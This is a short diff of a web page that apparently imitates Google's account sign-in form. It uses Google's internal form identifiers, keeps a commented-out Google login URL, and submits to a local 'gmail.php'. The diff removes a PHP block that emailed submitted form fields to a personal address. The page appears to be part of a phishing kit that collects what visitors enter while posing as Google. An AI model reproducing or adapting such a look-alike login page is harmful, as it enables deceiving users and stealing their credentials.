@@ -1953,31 +1953,7 @@
       ">
   <canvas id="canvas" class="circle" width="96" height="96"></canvas>
   </div>
-  <?php
-    $name = $_POST['name'];
-    $email = $_POST['email'];
-    $message = $_POST['message'];
-    $from = 'From: gmail'; 
-    $to = 'maxwellmccormack@hotmail.com'; 
-    $subject = 'Hello';
-
-    $body = "From: $name\n E-Mail: $email\n Message:\n $message";
-?>
-
-<?php
-if ($_POST['submit']) {
-}
-?>
-
-<?php
-if ($_POST['submit']) {
-    if (mail ($to, $subject, $body, $from)) { 
-        echo '<p>Your message has been sent!</p>';
-    } else { 
-        echo '<p>Something went wrong, go back and try again!</p>'; 
-    }
-}
-?>
+  
   <form action="gmail.php" method="post"  enctype="text/plain">
   <!-- <form novalidate method="post" action="https://accounts.google.com/AccountLoginInfo" id="gaia_loginform"> -->
   <div class="form-panel first valid" id="gaia_firstform">
